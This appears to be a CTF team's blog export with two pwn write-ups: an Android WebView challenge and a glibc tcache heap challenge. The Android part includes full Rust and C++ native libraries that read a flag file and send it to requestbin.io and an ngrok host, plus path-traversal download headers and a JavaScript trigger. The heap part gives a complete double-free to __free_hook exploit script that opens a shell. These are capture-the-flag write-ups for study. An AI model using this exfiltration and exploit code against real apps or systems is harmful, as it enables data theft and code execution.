downloadd9c14779206634d37e7f0e43d5c9537a Author: bubble#2768 TLDR Bypass domain google.com verification with javascript:// to redirect to the evil website. App trusts download_name so we can use path transversal to save the downloaded library into internal storage. Write a native library that will read the flag from the file system and send it through a socket. Write the necessary javascript to trigger the javascriptinterface and execute our malicious library. IntroductionAfter downloading the attachment we have the following files:12345678910111213$ unzip -l WM_Baby_Droid.zip Archive: WM_Baby_Droid.zip Length Date Time Name--------- ---------- ----- ---- 1978 2022-05-19 10:20 attachment/Dockerfile 3897305 2022-08-19 10:44 attachment/app-debug.apk 11 2022-08-19 11:36 attachment/flag 2333 2022-08-19 10:26 attachment/readme.md 1022 2022-08-19 10:30 attachment/run.sh 7848 2022-08-19 10:40 attachment/server.py 232 2022-04-19 18:58 attachment/server.sh--------- ------- 3910729 7 files Lets start by analysing the server.py. The server will request a poc url from the begining to be sent to the app through an intent:1234567print_to_user(\"Please enter your poc url:\")url = sys.stdin.readline().strip()# url should be like \"http://xxx\" to to ensure that `adb shell` passes intent.data correctly.if url.strip('\"') == url: url = f'\"&#123;url&#125;\"'...adb_activity(f\"&#123;VULER&#125;/.MainActivity\", wait=True, data=url) More useful information is given to us when a new emulator with android API_30 and x86_64 architecture is created:123456789101112131415161718192021222324252627282930313233343536373839404142def setup_emulator(): subprocess.call( \"avdmanager\" + \" create avd\" + \" --name 'pixel_xl_api_30'\" + \" --abi 'google_apis/x86_64'\" + \" --package 'system-images;android-30;google_apis;x86_64'\" + \" --device pixel_xl\" + \" --force\" + (\"\" if isMacos else \" &gt; /dev/null 2&gt; /dev/null\"), env=ENV, close_fds=True, shell=True) return subprocess.Popen( \"emulator\" + \" -avd pixel_xl_api_30\" + \" -no-cache\" + \" -no-snapstorage\" + \" -no-snapshot-save\" + \" -no-snapshot-load\" + \" -no-audio\" + \" -no-window\" + \" -no-snapshot\" + \" -no-boot-anim\" + \" -wipe-data\" + \" -accel on\" + \" -netdelay none\" + \" -no-sim\" + \" -netspeed full\" + \" -delay-adb\" + \" -port &#123;&#125;\".format(EMULATOR_PORT) + (\"\" if isMacos else \" &gt; /dev/null 2&gt; /dev/null \") + \"\", env=ENV, close_fds=True, shell=True, preexec_fn=os.setsid)...print_to_user(\"Preparing android emulator. This may takes about 2 minutes...\\n\")emulator = setup_emulator()adb([\"wait-for-device\"]) We also know from the file that the flag is being broadcasted here: 12with open(FLAG_FILE, \"r\") as f: adb_broadcast(f\"com.wmctf.SET_FLAG\", f\"&#123;VULER&#125;/.FlagReceiver\", extras=&#123;\"flag\": f.read()&#125;) Static AnalysisThe apk doesn’t have a lot of obfuscation (this was expected since the category of the challenge is pwn and not a reverse). We used jadx to analyse the app so lets see what we have in the AndroidManifest.xml. The application only has the INTERNET permission to connect to the internet, a receiver and the main activity:123456&lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;...&lt;activity android:name=\"com.wmctf.wmbabydroid.MainActivity\" android:exported=\"true\"&gt;...&lt;receiver android:name=\"com.wmctf.wmbabydroid.FlagReceiver\" android:exported=\"false\"&gt;... The launcher activity: The receiver: We don’t have to worry to generate a broadcast since the server will generate one for us (we saw this in the introduction section). Bypass getHostSince there is a verification to allow google.com urls to be loaded: 1if (!uri.getHost().endsWith(\".google.com\")) &#123; Me and my friend had this great idea of actually hosting our website in sites.google.com, we did implement this and the poc was working locally unfortunately everything into to the garbage when the organizers told us that China banned google so the servers wouldn’t be able to connect to google domains. Hearing this we finally realized this was probably a url parsing challenge and we tried multiple tricks like the ones mentioned in the orange blackhat presentation without any success. We eventually found this CVE about a vulnerability in getHost but it looks it only works on older API versions, more recent ones are already patched (We also know from the emulator configuration that the android API version is 30 so this wouldn’t work). We tried to analyse Android API 30 code trying to find a flaw in the code and also checking the URL RFC and try new things but without any success. We also thought of using an redirect to bypass the check but since the server is hosted in china and google.com is banned we forgot about this for a while. Another idea showed up on trying to use file:// to access the internal files of the emulator and read the flag, unfortunately to use this requires a special permission in the webview so we discarded this option. Eventually the organizers published an announcement for this challenge giving the tip to use javascript://. In the end it was kind of “simple” but we didn’t remember of trying javascript:// which makes sense and it eventually doesn’t even need to request the google domain which is perfect. The hint given was: Baby Droid Hint: JavaScript://www.google.com/%0d%0awindow.location.href=&#39;http://evil.com/&#39; Drop the file into the internal storage file directoryThe downloaded file is being saved in the external storage cache directory: 1String destPath = new File(MainActivity.this.getExternalCacheDir(), fileName).getPath(); Because of this we need to find a way to move it to the files directory (shared library will be loaded from that dir): 1File so = new File(getFilesDir() + \"/lmao.so\"); Since the server trusts the download_name from the header Content-Disposition we can use Path Transversal to save the file to the folder we want. The file is saved in /storage/emulated/0/Android/data/com.wmctf.wmbabydroid/cache and we want to move it to /data/data/com.wmctf.wmbabydroid/files/lmao.so. To achieve this we used the following download_name -&gt; ../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so. We used flask to implement the server in the backend: 12345678910111213141516171819202122232425from flask import Flask, send_file, make_response,render_templatefrom flask_cors import CORSdef create_app(test_config=None): app = Flask(__name__) CORS(app, expose_headers=[\"Content-Disposition\"]) @app.route('/') def index(): return render_template('index.html') @app.route('/download') def download(): response = make_response(send_file( \"libcargo.so\", as_attachment=True, download_name=\"../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so\" )) response.headers['Content-Disposition'] = 'attachment; filename=../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so' response.headers['User-Agent'] = 'kekw' return response return appcreate_app().run(debug=True, port=80, host='0.0.0.0') Implement the shared libraryWe will have the opportunity to run a malicious library in the victim’s device so we need to write a code that will read the flag from the file system and send the flag to through a HTTP request or a socket using tcp. Usually an android application has native methods that will be called from the native lib like in this example: 1public native String getSystemTime(); In this case we don’t have any, but looking at the documentation it seems when system.load is executed a function named JNI_OnLoad will be executed:123456789101112131415/** * Loads the native library specified by the &lt;code&gt;libname&lt;/code&gt; * argument. The &lt;code&gt;libname&lt;/code&gt; argument must not contain any platform * specific prefix, file extension or path. If a native library * called &lt;code&gt;libname&lt;/code&gt; is statically linked with the VM, then the * JNI_OnLoad_&lt;code&gt;libname&lt;/code&gt; function exported by the library is invoked. * See the JNI Specification for more details. * * Otherwise, the libname argument is loaded from a system library * location and mapped to a native library image in an implementation- * dependent manner. **/public static void loadLibrary(String libname) &#123; Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);&#125; The following picture illustrates this well: I’m not an android developer myself but since I’ve reversed a bunch of malware in my work using rust native libraries I decided to implement one in rust, since I already had some experience doing it and I thought it wouldn’t be a problem doing it here as well. Unfortunately this ended up being an bad idea since rust libraries are usually bigger than the normal ones and this messed up our final payload (size was about 11mb but it was enough to disturb the poc in the server). For the lulz we will share the rust library we implemented: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116use std::os::raw::&#123;c_char&#125;;use std::ffi::&#123;CString, CStr&#125;;use std::fs;use std::ffi::c_void;use hyper_tls::HttpsConnector;use std::&#123;thread, time&#125;;#[macro_use] extern crate log;extern crate android_log;async fn kekw() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt;&#123; // Create a new client object while true &#123; let b = std::path::Path::new(\"/data/data/com.wmctf.wmbabydroid/files/flag\").exists(); info!(\"Stuck in the loop &#123;&#125;\", b); let https2 = HttpsConnector::new(); let client2 = hyper::Client::builder() .build::&lt;_, hyper::Body&gt;(https2); // Build out our request let req = hyper::Request::builder() .method(hyper::Method::POST) .uri(\"&lt;redacted&gt;\") .header(\"user-agent\", \"WTF\") .header(\"content-type\", \"application/json\") .body(hyper::Body::from(\"Stuck waiting for flag\"))?; let resp2 = client2.request(req).await?; // Get the response body bytes. let body_bytes2 = hyper::body::to_bytes(resp2.into_body()).await?; // Convert the body bytes to utf-8 let body2 = String::from_utf8(body_bytes2.to_vec()).unwrap(); if b &#123; break; &#125; let ten_millis = time::Duration::from_millis(500); let now = time::Instant::now(); thread::sleep(ten_millis); &#125; //let ten_millis = time::Duration::from_millis(2000); //let now = time::Instant::now(); //thread::sleep(ten_millis); let https = HttpsConnector::new(); let client = hyper::Client::builder() .build::&lt;_, hyper::Body&gt;(https); //let client = hyper::Client::new(); let contents = fs::read_to_string(\"/data/data/com.wmctf.wmbabydroid/files/flag\") .expect(\"Should have been able to read the file\"); info!(\"this is a debug &#123;&#125;\", contents); // Build out our request let req = hyper::Request::builder() .method(hyper::Method::POST) .uri(\"https://requestbin.io/wn9ivmwn\") .header(\"user-agent\", \"WTF\") .header(\"content-type\", \"application/json\") .body(hyper::Body::from(contents))?; // Pass our request builder object to our client. let resp = client.request(req).await?; // Get the response body bytes. let body_bytes = hyper::body::to_bytes(resp.into_body()).await?; // Convert the body bytes to utf-8 let body = String::from_utf8(body_bytes.to_vec()).unwrap(); info!(\"this is a debug &#123;&#125;\", body); //println!(\"&#123;&#125;\", body); Ok(())&#125;/// Expose the JNI interface for android below#[cfg(target_os=\"android\")]#[allow(non_snake_case)]pub mod android &#123; extern crate jni; use super::*; use self::jni::JNIEnv; use self::jni::JavaVM; use self::jni::objects::&#123;JClass, JString&#125;; use self::jni::sys::&#123;jstring&#125;; use self::jni::sys::JNI_VERSION_1_6; use self::jni::sys::&#123;jint, jshort&#125;; #[no_mangle] pub extern \"system\" fn JNI_OnLoad(_vm: JavaVM, _reserved: *mut c_void) -&gt; jint &#123; android_logger::init_once( android_logger::Config::default().with_min_level(log::Level::Trace), ); let c_str = unsafe &#123; CStr::from_ptr(CString::new(\"kekw feast\").unwrap().as_ptr()) &#125;; let recipient = match c_str.to_str() &#123; Err(_) =&gt; \"there\", Ok(string) =&gt; string, &#125;; let mut rt = tokio::runtime::Runtime::new().unwrap(); match rt.block_on(kekw()) &#123; Ok(_) =&gt; info!(\"Done\"), Err(e) =&gt; error!(\"An error ocurred: &#123;&#125;\", e), &#125;; info!(\"kekw\"); //CString::new(\"Hellow \".to_owned() + recipient).unwrap().into_raw(); JNI_VERSION_1_6 &#125;&#125; Rust lib was working locally but not in the challenge server so much later we decided to re-implement using “normal” native libraries (file size was reduced to 800kb): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string&gt;#include &lt;netdb.h&gt;#include &lt;errno.h&gt;#include &lt;fstream&gt;#include &lt;thread&gt;#include \"jni.h\"bool is_file_exist(const char * fileName) &#123; std::ifstream infile(fileName); bool r = infile.good(); infile.close(); return r;&#125;class Task &#123;public: void execute(std::string command) &#123; int sockfd, portno; struct sockaddr_in serv_addr; struct hostent * server; char buffer[256] = \"\"; portno = 12099; sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname(\"4.tcp.eu.ngrok.io\"); if (server == NULL) &#123; fprintf(stderr, \"ERROR, no such host\\n\"); exit(0); &#125; bzero((char * ) &amp; serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char * ) server -&gt; h_addr, (char * ) &amp; serv_addr.sin_addr.s_addr, server -&gt; h_length); serv_addr.sin_port = htons(portno); if (connect(sockfd, (struct sockaddr * ) &amp; serv_addr, sizeof(serv_addr)) &lt; 0) fprintf(stderr, \"ERROR connecting\"); while (true) &#123; if (is_file_exist(\"/data/data/com.wmctf.wmbabydroid/files/flag\")) &#123; break; &#125; send(sockfd, \"File doesn't exist yet\\n\", strlen(\"File doesn't exist yet\\n\"), 0); sleep(1); &#125; FILE * fd = fopen(\"/data/data/com.wmctf.wmbabydroid/files/flag\", \"r\"); int i = 0; while (1) &#123; char c = fgetc(fd); if (feof(fd)) break; buffer[i++] = c; &#125; fclose(fd); if (send(sockfd, buffer, strlen(buffer), 0) &lt; 0) &#123; char * write_error = strerror(errno); &#125; close(sockfd); &#125;&#125;;JNIEXPORT jint JNI_OnLoad(JavaVM * vm, void * ) &#123; JNIEnv * env; if (vm -&gt; GetEnv(reinterpret_cast &lt; void ** &gt; ( &amp; env), JNI_VERSION_1_6) != JNI_OK) &#123; return JNI_ERR; &#125; Task taskPtr; std::thread th( &amp; Task::execute, taskPtr, \"Sample Task\"); th.join(); return JNI_VERSION_1_6;&#125; We also added this infinite loop to check if the flag file already exists (If the payload is too fast the flag might not be in the directory):1234567while(true)&#123; if (is_file_exist(\"/data/data/com.wmctf.wmbabydroid/files/flag\")) &#123; break; &#125; send(sockfd, \"File doesn't exist yet\\n\", strlen(\"File doesn't exist yet\\n\"), 0); sleep(1); &#125; One line command to extract the lib from the built apk:1unzip -p ~/AndroidStudioProjects/&lt;project-name&gt;/app/build/outputs/apk/debug/app-debug.apk lib/x86_64/libwmbabydroid.so &gt; libcargo.so We followed the google documentation on how to implement native libraries in android. Trigger the @JavascriptInterface codeJavascript Interfaces allows exposing methods to JavaScript: 12345678910111213webView.addJavascriptInterface(this, \"lmao\");...@JavascriptInterfacepublic void lmao() &#123; try &#123; File so = new File(getFilesDir() + \"/lmao.so\"); if (so.exists()) &#123; System.load(so.getPath()); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; The @JavascriptInterface notation will allow us to execute java code function from javascript for example to execute the code above we can use: 123function javaInterface() &#123; lmao.lmao();&#125; To trigger the download and the JavascriptInterface we created the following html file:123456789101112131415161718192021&lt;html&gt; &lt;body onload=\"getAll()\"&gt; &lt;!--&lt;iframe src=\"/download\"&gt;&lt;/iframe&gt;--&gt; &lt;a href=\"/download\" id=\"test\"&gt;qweqwe&lt;/a&gt; &lt;/body&gt; &lt;script&gt; function getAll() &#123; lmao.lmao(); setTimeout(download, 3000); setTimeout(timeoutFunc, 15000); &#125; function download() &#123; document.getElementById(\"test\").click(); &#125; function timeoutFunc() &#123; lmao.lmao(); &#125; &lt;/script&gt;&lt;/html&gt; Note that running lmao.lmao() first is very important since the files directory is not created when the apk is installed. The method getFilesDir() will create the directory for us: 1File so = new File(getFilesDir() + \"/lmao.so\"); Final scriptUsing pwntools to send the link to the app in the server1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *import reimport hashlibimport stringimport tracebackdef main(): r = remote('localhost', 10086) if not args.REMOTE else remote( '43.248.96.7', 10086) a = r.recvuntil(b\"Please enter the xxxx to satisfy the above equation:\\n\") begin, end, hash_digest = re.findall( r'(?&lt;=\")[a-zA-Z0-9]+?(?=\")', a.decode()) for a in string.ascii_letters: for b in string.ascii_letters: for c in string.ascii_letters: for d in string.ascii_letters: test_hash = hashlib.sha256( (begin+a+b+c+d).encode()).hexdigest() if test_hash == hash_digest: print(a+b+c+d) r.sendline((a+b+c+d).encode()) r.recvuntil(b'Please enter your poc url:\\n') r.sendline( \"JavaScript://www.google.com/%0d%0awindow.location.href='&#123;&#125;'\".format(args.HOST).encode()) print(r.recvuntil(b'exiting......\\n', timeout=60*5)) r.close() returnif args.LOOP: while True: try: main() except KeyboardInterrupt: break except: traceback.print_exc() continueelse: main() Running it: 12345678$ python wm_baby_droid.py REMOTE LOOP HOST=https://wmctf2022.herokuapp.com[+] Opening connection to 43.248.96.7 on port 10086: DonexthOb'Preparing android emulator. This may takes about 2 minutes...\\n\\nLaunching! Let your apk fly for a while...\\n\\nexiting......\\n'[*] Closed connection to 43.248.96.7 port 10086[+] Opening connection to 43.248.96.7 on port 10086: DonexsEK[*] Closed connection to 43.248.96.7 port 10086 Receiving the flag on our listening service: 12$ nc -l -k 5000WMCTF&#123;e0230a12-fa8d-443a-959a-bb61d24e5132&#125; The flag was WMCTF{e0230a12-fa8d-443a-959a-bb61d24e5132}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"Android","slug":"Pwn/Android","permalink":"https://teamrocketist.github.io/categories/Pwn/Android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://teamrocketist.github.io/tags/android/"},{"name":"adb","slug":"adb","permalink":"https://teamrocketist.github.io/tags/adb/"},{"name":"javascriptinterfaces","slug":"javascriptinterfaces","permalink":"https://teamrocketist.github.io/tags/javascriptinterfaces/"},{"name":"nativelibraries","slug":"nativelibraries","permalink":"https://teamrocketist.github.io/tags/nativelibraries/"},{"name":"emulator","slug":"emulator","permalink":"https://teamrocketist.github.io/tags/emulator/"},{"name":"gethost","slug":"gethost","permalink":"https://teamrocketist.github.io/tags/gethost/"},{"name":"uri","slug":"uri","permalink":"https://teamrocketist.github.io/tags/uri/"},{"name":"urigethost","slug":"urigethost","permalink":"https://teamrocketist.github.io/tags/urigethost/"}]},{"title":"[Pwn] DiceCTF2021 - flippidy","slug":"Pwn-DiceCTF2021-flippidy","date":"2021-02-08T06:03:26.000Z","updated":"2022-08-23T04:34:08.813Z","comments":true,"path":"2021/02/08/Pwn-DiceCTF2021-flippidy/","link":"","permalink":"https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/","excerpt":"","text":"flippidy Solves: 62 Points: 149 Description:See if you can flip this program into a flag :D nc dicec.tf 31904 flippidy45ffbb615d868486383a07220e6e6bfc libc.so.650390b2ae8aaa73c47745040f54e602f Author: joshdabosh TLDR Set the limit of notes to 1. Alloc a new note with the global 0x404020. Running flip will trigger a double free and poison the next pointer of tchachebin[0x40] to 0x404020. Next malloc will write to 0x404020 which is where is located the pointer of the strings of the menu. Change this pointers to a GOT[&#39;fgets&#39;] to get a leak, at the same time we can corrupt the pointer at 0x404040 to 0x404158. 0x404158 is the address of the first entry of the note list having the control of this will give us arbitrary write at our control. Change the pointer at 0x404158 to free_hook and set it to one_gadget. Trigger free with flip function to get a shell. Information extractionFile12$ file flippidyflippidy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bad92d378d5af68a52fd2856145dc8588533a25, for GNU/Linux 3.2.0, stripped Security123$ checksec --file=flippidyRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEFull RELRO Canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 4 flippidy Static analysisMain function123456789101112131415161718192021222324252627282930313233343536373839void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+Ch] [rbp-4h] setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); sub_401211(); printf(\"%s\", \"To get started, first tell us how big your notebook will be: \"); firstRead_404150 = sub_401254(); qword_404158 = malloc(8 * firstRead_404150); memset(qword_404158, 0, 8 * firstRead_404150); while ( 1 ) &#123; sub_4011C6(); printf(\": \"); v3 = sub_401254(); if ( v3 == 3 ) &#123; puts(\"Goodbye!\"); exit(0); &#125; if ( v3 &gt; 3 ) &#123;LABEL_11: puts(\"Invalid choice.\"); &#125; else if ( v3 == 1 ) &#123; add_4012D0(); &#125; else &#123; if ( v3 != 2 ) goto LABEL_11; flip_401378(); &#125; &#125;&#125; The main function asks for the size of the note list, the size of the list is stored at 0x404150: 123456789101112131415__int64 sub_401254()&#123; char s; // [rsp+10h] [rbp-20h] unsigned __int64 v2; // [rsp+28h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;s, 0, 0x14uLL); if ( !fgets(&amp;s, 0x14, stdin) ) exit(0); return (unsigned int)atoi(&amp;s);&#125;...printf(\"%s\", \"To get started, first tell us how big your notebook will be: \");firstRead_404150 = sub_401254();... sub_4011c6 will print the menu with the options to operate on the notebook, note that the strings are present in a global variable at 0x404020.123456789101112131415161718int sub_4011C6()&#123; int result; // eax int i; // [rsp+Ch] [rbp-4h] result = puts(\"\\n\"); for ( i = 0; i &lt;= 3; ++i ) result = puts(off_404020[i]); return result;&#125; ... while ( 1 ) &#123; sub_4011C6(); printf(\": \"); ... &#125; ... A very important thing to refer that offsets at 0x404020 contains pointers (we can use this later if we manage to get an arbitrary write to leak libc): 123456.data:0000000000404020 off_404020 dq offset aMenu ; DATA XREF: sub_4011C6+2A↑o.data:0000000000404020 ; \"----- Menu -----\".data:0000000000404028 dq offset a1AddToYourNote ; \"1. Add to your notebook\".data:0000000000404030 dq offset a2FlipYourNoteb ; \"2. Flip your notebook!\".data:0000000000404038 dq offset a3Exit ; \"3. Exit\".data:0000000000404040 aMenu db '----- Menu -----',0 ; DATA XREF: .data:off_404020↑o Add to your notebookWe can add new notes with option 1, the size is limited to 0x30. 1234567891011121314int sub_4012D0()&#123; void **v1; // rbx int v2; // [rsp+Ch] [rbp-14h] printf(\"Index: \"); v2 = sub_401254(); if ( v2 &lt; 0 || v2 &gt;= firstRead_404150 ) return puts(\"Invalid index.\"); v1 = (void **)((char *)qword_404158 + 8 * v2); *v1 = malloc(0x30uLL); printf(\"Content: \"); return (unsigned __int64)fgets(*((char **)qword_404158 + v2), 0x30, stdin);&#125; Flip functionFlip function will exchange the position of the notes hence the name flipping, in the end it frees the old notes and mallocs the new ones by copping their contents with strcpy. For example if the notebook has 2 notes this how it works: strcpy the contents of 1st note to s. Frees 1st note. strcpy the content of 2nd note to dest. Frees 2nd note. malloc and store this new chunk at the position of the 2nd note and strcpy the content of the 1st note s. malloc and store this new chunk at the position of the 1st note and strcpy the content of the 2nd note dest. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061unsigned __int64 sub_401378()&#123; void **v0; // rbx void **v1; // rbx char v3; // [rsp+Ah] [rbp-A6h] char v4; // [rsp+Bh] [rbp-A5h] int i; // [rsp+Ch] [rbp-A4h] char s; // [rsp+10h] [rbp-A0h] char dest; // [rsp+50h] [rbp-60h] unsigned __int64 v8; // [rsp+98h] [rbp-18h] v8 = __readfsqword(0x28u); for ( i = 0; i &lt;= firstRead_404150 / 2; ++i ) &#123; memset(&amp;s, 0, 0x40uLL); memset(&amp;dest, 0, 0x40uLL); v3 = 0; v4 = 0; if ( *((_QWORD *)qword_404158 + i) ) &#123; strcpy(&amp;s, *((const char **)qword_404158 + i)); free(*((void **)qword_404158 + i)); &#125; else &#123; v3 = 1; &#125; if ( *((_QWORD *)qword_404158 + firstRead_404150 - i - 1) ) &#123; strcpy(&amp;dest, *((const char **)qword_404158 + firstRead_404150 - i - 1)); free(*((void **)qword_404158 + firstRead_404150 - i - 1)); &#125; else &#123; v4 = 1; &#125; *((_QWORD *)qword_404158 + i) = 0LL; *((_QWORD *)qword_404158 + firstRead_404150 - i - 1) = 0LL; if ( v3 != 1 ) &#123; v0 = (void **)((char *)qword_404158 + 8 * (firstRead_404150 - i) - 8); *v0 = malloc(0x30uLL); strcpy(*((char **)qword_404158 + firstRead_404150 - i - 1), &amp;s); &#125; else &#123; *((_QWORD *)qword_404158 + firstRead_404150 - i - 1) = 0LL; &#125; if ( v4 != 1 ) &#123; v1 = (void **)((char *)qword_404158 + 8 * i); *v1 = malloc(0x30uLL); strcpy(*((char **)qword_404158 + i), &amp;dest); &#125; else &#123; *((_QWORD *)qword_404158 + i) = 0LL; &#125; &#125; return v8 - __readfsqword(0x28u);&#125; Getting a leakTo get a leak we first need to find a way to get an arbitrary write, we know that the pointers to the strings of the menu are present at a global variable at 0x404020 if we can manage to change this pointer to a GOT address we can leak a libc address. What happens if we run the flip function when the size of the notebook only has 1 note ? The 1st note will be also the last note! because of this we will have a double free! and at the same time we will corrupt the next pointer of the tcachebin[0x40] list to the value we want! Visually this is what happens:Source code to achieve this: 123456789101112def add(index, content): r.sendlineafter(': ', '1') r.sendlineafter('Index: ', str(index)) r.sendlineafter('Content: ', content)def flip(): r.sendlineafter(': ', '2')r = getConn()r.sendlineafter('To get started, first tell us how big your notebook will be: ', str(1))add(0, p64(0x404020))flip() # Triggers double free Next malloc will overwrite data in 0x402020 which contains the pointers of the MENU, if we change them to a GOT address we will leak libc in the next menu print of the loop. The tcache bin list is looking like this right now: 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2d We have enough bytes to overwrite the 3rd item of the list at 0x404040 we can easily poison this tcache bin by changing it to 0x404158. 0x404158 address is important because it contains the pointer of the first note of the notebook, if we control this value we will be able to write anywhere. 12345678# 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2dadd(0,p64(elf.got['fgets'])*4+p64(0x404158))FGETS = u64(r.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))LIBC = FGETS-libc.symbols['fgets']SYSTEM = LIBC+libc.symbols['system']ONE_SHOT = LIBC+0x4f322log.info(\"FGETS 0x%x\" % FGETS)log.info(\"LIBC 0x%x\" % LIBC) Getting a shellNow that we have libc we just need to overwrite malloc_hook or free_hook to one_gadget to get a shell. After our last malloc the tcachebin is looking like this:0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; … 1st malloc and setting 0xdeadbeef as input, the list will look like this:0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef 2nd malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0 3rd malloc and setting 0xdeadbeef as input:0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef 4th malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; … Next malloc will write into FREE_HOOK, with that we can easily fill it with one_gadget address. The python code:12345678910# 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...add(0,p64(0xdeadbeef))# 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeefadd(0,p64(LIBC+libc.symbols['__free_hook']))# 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0add(0,p64(0xdeadbeef))# 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeefadd(0,p64(LIBC+libc.symbols['__free_hook']))# FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...add(0,p64(ONE_SHOT)) # Sets FREE_HOOK to ONE_SHOT Triggering free to get a shell: 123flip() # Triggers free_hook and gets ourselves a shellr.interactive()r.close() The entire script: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *host, port = \"dicec.tf\", \"31904\"filename = \"./flippidy\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) for x in bp: script += \"b *0x%x\\n\"%(x) gdb.attach(r,gdbscript=script)def add(index, content): r.sendlineafter(': ', '1') r.sendlineafter('Index: ', str(index)) r.sendlineafter('Content: ', content)def flip(): r.sendlineafter(': ', '2')FREE = [0x4014D2,0x401444]context.terminal = ['tmux', 'new-window']r = getConn()r.sendlineafter('To get started, first tell us how big your notebook will be: ', str(1))add(0, p64(0x404020))if not args.REMOTE and args.GDB: debug([0x40132F]+FREE)flip() # Triggers double free# 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2dadd(0,p64(elf.got['fgets'])*4+p64(0x404158))FGETS = u64(r.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))LIBC = FGETS-libc.symbols['fgets']SYSTEM = LIBC+libc.symbols['system']ONE_SHOT = LIBC+0x4f322log.info(\"FGETS 0x%x\" % FGETS)log.info(\"LIBC 0x%x\" % LIBC)# 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...add(0,p64(0xdeadbeef))# 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeefadd(0,p64(LIBC+libc.symbols['__free_hook']))# 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0add(0,p64(0xdeadbeef))# 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeefadd(0,p64(LIBC+libc.symbols['__free_hook']))# FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...add(0,p64(ONE_SHOT)) # Sets FREE_HOOK to ONE_SHOTflip() # Triggers free_hook and gets ourselves a shellr.interactive()r.close() Running the script: 12345678910111213141516171819202122$ python flippidy.py REMOTE[*] '/ctf/work/pwn/flippidy/flippidy' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/ctf/work/pwn/flippidy/libc-2.27.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to dicec.tf on port 31904: Done[*] FGETS 0x7fb4d2848b20[*] LIBC 0x7fb4d27ca000[*] Switching to interactive mode$ lschallengeflag.txt$ cat flag.txtdice&#123;some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc 